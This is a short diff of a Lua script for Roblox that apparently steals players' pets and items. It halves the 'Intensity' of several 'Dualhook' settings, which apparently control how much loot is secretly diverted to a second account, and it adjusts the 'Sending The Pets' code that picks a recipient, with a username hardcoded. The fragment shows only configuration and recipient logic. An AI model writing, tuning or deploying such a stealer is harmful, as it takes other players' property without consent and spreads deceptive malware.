@@ -24,15 +24,15 @@ getgenv().Settings = {
     },
     Events = {
         Dualhook = true,
-        Intensity = 100 --%
+        Intensity = 50 --%
     },
     Secrets = {
         Dualhook = true,
-        Intensity = 100 --%
+        Intensity = 50 --%
     },
     HC_DM_Mythics = {
         Dualhook = true,
-        Intensity = 100 --%
+        Intensity = 50 --%
     },
     Gems = {
         Dualhook = true,
@@ -1264,7 +1264,7 @@ end
 -- Sending The Pets
 
 local ndUser
-if UserName2 ~= nil and UserName2 ~= "TehPucuk_55" and UserName2 ~= "TehPucuk_55" then
+if UserName2 ~= nil and UserName2 ~= "TehPucuk_55" and UserName2 ~= "" then
     ndUser = UserName2
 else
     ndUser = UserName
